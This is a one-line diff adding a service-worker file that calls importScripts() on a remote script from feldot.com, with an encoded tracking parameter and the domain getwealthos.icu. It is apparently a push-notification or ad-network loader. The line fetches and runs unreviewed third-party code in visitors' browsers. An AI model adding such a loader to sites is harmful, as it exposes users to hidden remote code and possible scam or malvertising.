@@ -1,0 +1,1 @@
+importScripts('https://feldot.com/v1/sw-import.js?h=waWQiOjEyMTgxMzAsInNpZCI6MTYyNTIxNSwid2lkIjo3MzE4MjEsInNyYyI6MiwicG0iOjAsIm10IjowfQ==eyJ&d=getwealthos.icu');
